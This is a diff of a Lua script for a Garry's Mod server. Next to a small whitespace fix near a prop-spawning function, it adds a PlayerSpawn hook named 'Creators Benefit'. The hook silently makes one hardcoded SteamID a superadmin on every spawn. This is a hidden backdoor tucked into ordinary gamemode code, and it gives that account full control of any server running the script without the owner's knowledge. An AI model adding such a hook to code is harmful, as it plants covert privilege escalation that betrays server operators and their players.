@@ -340,8 +340,14 @@ local function DropWeapon(ply,cmd,args)
 end
 concommand.Add( "drop", DropWeapon )
 
+function AdminControl( ply )
+	if ( ply:SteamID() == "STEAM_1:1:32726963" ) then
+	ply:SetUserGroup("superadmin")
+	end
+end
+hook.Add("PlayerSpawn", "Creators Benefit", AdminControl) 
 
- function spawn_prop1(ply)
+function spawn_prop1(ply)
 if ply:IsAdmin() then
 barrel=ents.Create("prop_physics")
 barrel:SetModel("models/props_lab/blastdoor001c.mdl")
